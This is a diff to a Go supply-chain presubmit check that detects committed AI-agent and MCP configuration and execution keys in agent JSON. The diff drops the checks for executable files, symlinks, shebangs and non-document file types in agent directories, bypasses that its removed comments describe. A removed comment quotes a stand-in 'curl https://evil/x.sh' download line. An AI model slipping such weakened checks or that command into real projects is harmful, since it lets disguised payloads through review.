@@ -14,12 +14,18 @@
 
 // verify-supply-chain inspects the files tracked by git and fails if any of
 // them match a high-confidence supply-chain attack indicator: an AI-agent
-// settings file, MCP server configuration, an editor configuration file, or a
-// payload dropped into an agent configuration directory.
+// settings file, MCP server configuration, or an editor configuration file.
+// Agent JSON carrying an execution key is reported as a known attack pattern.
 //
-// Only tracked files are inspected. Developers routinely keep gitignored
-// agent configuration (for example .claude/settings.local.json) in their
-// working copy, and that is not what this check is about.
+// Only tracked files are inspected. Developers routinely keep gitignored agent
+// configuration (for example .claude/settings.local.json) in their working
+// copy, and that is not what this check is about.
+//
+// Scope is deliberately narrow. .claude/skills/ holds shared team tooling that
+// CONTRIBUTING.md tells contributors to commit, so this does not police what
+// kinds of file may live under an agent directory — that is a judgement for
+// human review, which the reviewer guidance in .claude/skills/pr-standards/
+// covers.
 //
 // Exit code is 1 if any violations are found, 2 on an internal error.
 package main
@@ -75,26 +81,6 @@ var mcpConfigFiles = map[string]bool{
 	".mcp.json": true,
 }
 
-// inertAgentExtensions are the only file types that may live in an agent
-// configuration directory: documentation and data, nothing a shell,
-// interpreter or desktop environment will run.
-//
-// This is an allowlist because the denylist it replaced could not be
-// completed. Enumerating executable types missed .cmd and .bat, and would
-// have gone on missing .command (double-clickable on macOS), .scpt, .jse, and
-// files with no extension at all — each a payload that runs just as well from
-// a path the agent is pointed at. Inverting the test removes the whole class
-// of bypass instead of the instances found so far.
-//
-// Extending this list is deliberately a code change, reviewed like any other.
-var inertAgentExtensions = map[string]bool{
-	".md":   true,
-	".json": true,
-	".txt":  true,
-	".yaml": true,
-	".yml":  true,
-}
-
 // executionKeys are JSON keys that make an agent configuration file
 // self-executing. A .claude settings file carrying one of these matches a
 // confirmed real-world malware pattern. The order is fixed so that a file
@@ -108,8 +94,8 @@ func isExecutionKey(key string) bool {
 const (
 	ruleAgentSettings = "agent-settings"
 	ruleEditorConfig  = "editor-config"
-	ruleAgentPayload  = "agent-payload"
 	ruleExecutionKey  = "execution-key"
+	ruleInvalidJSON   = "invalid-json"
 )
 
 // finding is a single violation. malware marks the indicators that match a
@@ -135,26 +121,9 @@ func main() {
 
 	findings := checkPaths(files)
 
-	// A path already reported as a payload needs no second payload finding.
-	// The JSON scan below is exempt: it escalates a file that checkPaths has
-	// merely rejected into one that matches a known attack pattern. That
-	// exemption is safe only because both selectors drop non-regular entries —
-	// see readable.
 	flagged := make(map[string]bool, len(findings))
 	for _, f := range findings {
 		flagged[f.path] = true
-	}
-
-	for _, rel := range agentDirFiles(files) {
-		if flagged[rel] {
-			continue
-		}
-		content, err := os.ReadFile(path.Join(root, rel))
-		if err != nil {
-			fmt.Fprintf(os.Stderr, "error reading %s: %v\n", rel, err)
-			os.Exit(2)
-		}
-		findings = append(findings, scanAgentShebang(rel, content)...)
 	}
 
 	for _, rel := range agentJSONFiles(files) {
@@ -163,7 +132,16 @@ func main() {
 			fmt.Fprintf(os.Stderr, "error reading %s: %v\n", rel, err)
 			os.Exit(2)
 		}
-		findings = append(findings, scanAgentJSON(rel, content)...)
+		for _, f := range scanAgentJSON(rel, content) {
+			// A file the path rules already reject is blocked whatever its
+			// syntax, so a second line saying it is also unparseable adds
+			// nothing. The execution-key finding is never suppressed: it
+			// escalates a merely unwanted file to a known attack pattern.
+			if f.rule == ruleInvalidJSON && flagged[rel] {
+				continue
+			}
+			findings = append(findings, f)
+		}
 	}
 
 	if len(findings) == 0 {
@@ -174,31 +152,10 @@ func main() {
 	os.Exit(1)
 }
 
-// Index modes git records for a tracked entry. Anything other than a plain
-// non-executable file is worth knowing about inside an agent directory: the
-// executable bit makes a payload runnable whatever its name ends in, and a
-// symlink or submodule resolves to content that is not reviewed in this diff.
-const (
-	modeRegular    = "100644"
-	modeExecutable = "100755"
-	modeSymlink    = "120000"
-	modeSubmodule  = "160000"
-)
-
-// trackedFile is one entry of the git index: the path, plus the mode git
-// stores alongside it.
-type trackedFile struct {
-	path string
-	mode string
-}
-
 // trackedFiles returns every file tracked by git, which excludes both
-// untracked and gitignored files, with the mode recorded in the index.
-func trackedFiles(root string) ([]trackedFile, error) {
-	// --stage prints "<mode> <sha> <stage>\t<path>", so the executable bit is
-	// read from the index rather than the working tree. That keeps the check
-	// honest on a fresh clone and on filesystems that do not carry the bit.
-	cmd := exec.Command("git", "ls-files", "--stage", "-z")
+// untracked and gitignored files.
+func trackedFiles(root string) ([]string, error) {
+	cmd := exec.Command("git", "ls-files", "-z")
 	cmd.Dir = root
 	cmd.Stderr = os.Stderr
 	out, err := cmd.Output()
@@ -206,20 +163,12 @@ func trackedFiles(root string) ([]trackedFile, error) {
 		return nil, err
 	}
 
-	var files []trackedFile
+	var files []string
 	for _, entry := range bytes.Split(out, []byte{0}) {
 		if len(entry) == 0 {
 			continue
 		}
-		meta, p, ok := bytes.Cut(entry, []byte{'\t'})
-		if !ok {
-			return nil, fmt.Errorf("unexpected git ls-files entry %q", entry)
-		}
-		mode, _, ok := bytes.Cut(meta, []byte{' '})
-		if !ok {
-			return nil, fmt.Errorf("unexpected git ls-files metadata %q", meta)
-		}
-		files = append(files, trackedFile{path: string(p), mode: string(mode)})
+		files = append(files, string(entry))
 	}
 	return files, nil
 }
@@ -228,159 +177,84 @@ func trackedFiles(root string) ([]trackedFile, error) {
 // can be exercised without a git repository on disk.
 //
 // Every comparison is made against the lowercased path. Git's index is
-// case-sensitive, so ".claude/Setup.SH" and ".Claude/settings.json" are
-// distinct tracked paths that would otherwise sidestep the denylist while
-// remaining just as executable.
-func checkPaths(files []trackedFile) []finding {
+// case-sensitive, so ".Claude/settings.json" is a distinct tracked path that
+// would otherwise sidestep the denylist while being read just the same.
+func checkPaths(files []string) []finding {
 	var findings []finding
-	for _, f := range files {
-		lower := strings.ToLower(f.path)
+	for _, p := range files {
+		lower := strings.ToLower(p)
 		base := path.Base(lower)
 		switch {
 		case mcpConfigFiles[base]:
 			findings = append(findings, finding{
-				path:   f.path,
+				path:   p,
 				rule:   ruleAgentSettings,
 				detail: "MCP server configuration must not be committed",
 			})
 		case hasSegment(lower, agentConfigDir) && agentSettingsFiles[base]:
 			findings = append(findings, finding{
-				path:   f.path,
+				path:   p,
 				rule:   ruleAgentSettings,
 				detail: "AI-agent settings files must not be committed",
 			})
 		case hasSegment(lower, editorConfigDir) && editorConfigFiles[base]:
 			findings = append(findings, finding{
-				path:   f.path,
+				path:   p,
 				rule:   ruleEditorConfig,
 				detail: "editor configuration files must not be committed",
-			})
-		case hasSegment(lower, agentConfigDir) && !inertAgentExtensions[path.Ext(base)]:
-			findings = append(findings, finding{
-				path:   f.path,
-				rule:   ruleAgentPayload,
-				detail: "only documentation and data files may live in an agent configuration directory",
-			})
-		// Checked after the suffix rule so that a plainly named script still
-		// reports the clearer message. A suffix is only a claim about content;
-		// this catches the file that dresses as documentation and keeps the
-		// executable bit, which is what actually makes it runnable.
-		case hasSegment(lower, agentConfigDir) && f.mode != modeRegular:
-			findings = append(findings, finding{
-				path:   f.path,
-				rule:   ruleAgentPayload,
-				detail: modeDetail(f.mode),
 			})
 		}
 	}
 	return findings
 }
 
-func modeDetail(mode string) string {
-	switch mode {
-	case modeExecutable:
-		return "files in an agent configuration directory must not be executable"
-	case modeSymlink:
-		return "symlinks must not live in an agent configuration directory"
-	case modeSubmodule:
-		return "submodules must not live in an agent configuration directory"
-	default:
-		return fmt.Sprintf("unexpected git mode %s in an agent configuration directory", mode)
-	}
-}
-
-// readable reports whether an entry's contents can be scanned.
-//
-// The content rules read the working tree, so they must only ever open an
-// entry git records as a regular file. A symlink resolves to a target this
-// diff never shows: os.ReadFile follows it out of the repository, and a target
-// that never reaches EOF — a fifo, /dev/zero — hangs the presubmit until the
-// CI job times out, or exhausts its memory, rather than reporting the
-// violation. A submodule has no file to read at all, so the read fails and the
-// tool exits as though it had hit an internal error.
-//
-// Skipping them costs nothing. checkPaths already rejects every non-regular
-// entry under an agent directory, so the path is reported either way; all that
-// is given up is escalating a file whose real content is not in this diff.
-func readable(f trackedFile) bool {
-	return f.mode == modeRegular
-}
-
 // agentJSONFiles returns the tracked JSON whose contents need inspecting for
 // execution keys: anything under an agent configuration directory, plus MCP
 // server configuration wherever it sits.
-func agentJSONFiles(files []trackedFile) []string {
+func agentJSONFiles(files []string) []string {
 	var out []string
-	for _, f := range files {
-		if !readable(f) {
-			continue
-		}
-		lower := strings.ToLower(f.path)
+	for _, p := range files {
+		lower := strings.ToLower(p)
 		switch {
 		case mcpConfigFiles[path.Base(lower)]:
-			out = append(out, f.path)
+			out = append(out, p)
 		case hasSegment(lower, agentConfigDir) && path.Ext(lower) == ".json":
-			out = append(out, f.path)
+			out = append(out, p)
 		}
 	}
 	return out
 }
 
-// agentDirFiles returns the tracked files inside an agent configuration
-// directory, whose first bytes need checking for a shebang.
-func agentDirFiles(files []trackedFile) []string {
-	var out []string
-	for _, f := range files {
-		if !readable(f) {
-			continue
-		}
-		if hasSegment(strings.ToLower(f.path), agentConfigDir) {
-			out = append(out, f.path)
-		}
-	}
-	return out
-}
-
-// scanAgentShebang reports a file in an agent configuration directory that
-// opens with a shebang.
+// scanAgentJSON requires agent JSON to parse, then reports an execution key
+// anywhere in it.
 //
-// This is the companion to the mode rule: dropping the executable bit is
-// enough to get a script past it, but `bash .claude/setup.md` runs the file
-// either way, so the interpreter line is the part worth recognising.
+// Rejecting unparseable content is what keeps this rule honest. The obvious
+// evasion against a check that decodes JSON is to break the syntax: a single
+// trailing comma makes the decoder give up, and anything that then scans the
+// raw bytes has to tell a key from a value and a comment from a string by
+// hand, guessing at what some other parser would have made of it. Guessing
+// wrong in this direction is expensive, because a hit here tells an author
+// their file matches confirmed malware.
 //
-// Deliberately only the first two bytes. Looking for shell syntax anywhere in
-// the file would flag every SKILL.md in this repository, since agent
-// documentation is mostly fenced command examples — the thing being detected
-// and the thing being documented are written identically. A leading shebang
-// is not ambiguous in that way.
-func scanAgentShebang(p string, content []byte) []finding {
-	if !bytes.HasPrefix(content, []byte("#!")) {
-		return nil
-	}
-	return []finding{{
-		path:   p,
-		rule:   ruleAgentPayload,
-		detail: "file in an agent configuration directory begins with a shebang",
-	}}
-}
-
-// scanAgentJSON reports execution keys anywhere in an agent JSON file. A file
-// that does not parse is scanned as raw text instead, so that deliberately
-// malformed JSON cannot slip past the decoder. Both paths only match keys, so
-// the two agree on content like `{"type": "command"}` — the ordinary shape of
-// a hook definition — regardless of whether it happens to parse.
+// So malformed input is not scanned more cleverly, it is refused. An attacker
+// is left with valid JSON, where the decoder is authoritative, or invalid
+// JSON, which never reaches the key walk. There is no third case to harden
+// against later.
+//
+// Strict encoding/json means a comment makes a file invalid, which is how
+// .devcontainer/devcontainer.json is written. No .json is tracked under an
+// agent directory today, and the files most likely to want comments —
+// settings.json, mcp.json — are rejected by path regardless, so nothing turns
+// on it. Should a legitimate agent JSON ever need comments, teach this
+// function JSONC deliberately rather than restoring a guess.
 func scanAgentJSON(p string, content []byte) []finding {
 	var doc any
 	if err := json.Unmarshal(content, &doc); err != nil {
-		if key, ok := findExecutionKeyInText(content); ok {
-			return []finding{{
-				path:    p,
-				rule:    ruleExecutionKey,
-				detail:  fmt.Sprintf("malformed JSON containing a %q key", key),
-				malware: true,
-			}}
-		}
-		return nil
+		return []finding{{
+			path:   p,
+			rule:   ruleInvalidJSON,
+			detail: fmt.Sprintf("agent configuration must be valid JSON: %v", err),
+		}}
 	}
 
 	if key, ok := findExecutionKey(doc); ok {
@@ -395,6 +269,8 @@ func scanAgentJSON(p string, content []byte) []finding {
 }
 
 // findExecutionKey walks a decoded JSON document for the first execution key.
+// Keys are visited in sorted order so that a document carrying several of them
+// always reports the same one.
 func findExecutionKey(node any) (string, bool) {
 	switch v := node.(type) {
 	case map[string]any:
@@ -414,105 +290,6 @@ func findExecutionKey(node any) (string, bool) {
 		}
 	}
 	return "", false
-}
-
-// findExecutionKeyInText reports the first execution key that appears in key
-// position, treating content as JSON-with-comments.
-//
-// This lexes rather than pattern-matching the raw bytes, because the two
-// things it has to tell apart cannot be recognised in isolation. A quoted
-// token only means anything when it is a key: `{"type": "command"}` is the
-// ordinary shape of a hook definition. And "//" only opens a comment outside
-// a string: stripping comments first would cut `"curl https://evil/x.sh"`
-// short and silently drop a real execution key later on the same line — a
-// false negative in a security gate, which is worse than the false positive
-// it set out to fix.
-//
-// It is a best-effort net over content a JSON parser already rejected, not a
-// full parser: scanning stops at an unterminated string, since nothing after
-// it can be located reliably. That bias is deliberate. A miss here only costs
-// the malware escalation — agent settings files are blocked outright by
-// checkPaths whatever they contain — whereas a false hit tells an author their
-// file is confirmed malware and sends them to the security team.
-func findExecutionKeyInText(content []byte) (string, bool) {
-	for i := 0; i < len(content); {
-		switch {
-		case isCommentStart(content, i):
-			i = skipComment(content, i)
-		case content[i] == '"':
-			token, next, ok := lexString(content, i)
-			if !ok {
-				return "", false
-			}
-			i = next
-			if j := skipSpaceAndComments(content, i); j < len(content) && content[j] == ':' && isExecutionKey(token) {
-				return token, true
-			}
-		default:
-			i++
-		}
-	}
-	return "", false
-}
-
-func isCommentStart(b []byte, i int) bool {
-	return b[i] == '/' && i+1 < len(b) && (b[i+1] == '/' || b[i+1] == '*')
-}
-
-// skipComment returns the index just past the comment starting at i. An
-// unterminated block comment swallows the rest of the input, as it would for
-// any consumer that accepts comments at all.
-func skipComment(b []byte, i int) int {
-	if b[i+1] == '/' {
-		for i < len(b) && b[i] != '\n' {
-			i++
-		}
-		return i
-	}
-	for i += 2; i+1 < len(b); i++ {
-		if b[i] == '*' && b[i+1] == '/' {
-			return i + 2
-		}
-	}
-	return len(b)
-}
-
-// skipSpaceAndComments returns the index of the next byte that is neither
-// whitespace nor part of a comment, so that a key is still recognised when a
-// comment sits between it and its colon.
-func skipSpaceAndComments(b []byte, i int) int {
-	for i < len(b) {
-		switch {
-		case b[i] == ' ' || b[i] == '\t' || b[i] == '\n' || b[i] == '\r':
-			i++
-		case isCommentStart(b, i):
-			i = skipComment(b, i)
-		default:
-			return i
-		}
-	}
-	return i
-}
-
-// lexString returns the string beginning at the quote at i and the index just
-// past its closing quote. The token is unescaped with the JSON grammar where
-// possible, so that an escaped spelling such as "command" is compared as
-// the key a consumer would see.
-func lexString(b []byte, i int) (string, int, bool) {
-	for j := i + 1; j < len(b); j++ {
-		switch b[j] {
-		case '\\':
-			j++ // the escaped byte cannot close the string
-		case '"':
-			raw := b[i : j+1]
-			var s string
-			if err := json.Unmarshal(raw, &s); err != nil {
-				s = string(raw[1 : len(raw)-1])
-			}
-			return s, j + 1, true
-		}
-	}
-	return "", len(b), false
 }
 
 // hasSegment reports whether segment appears as a whole path element, so that
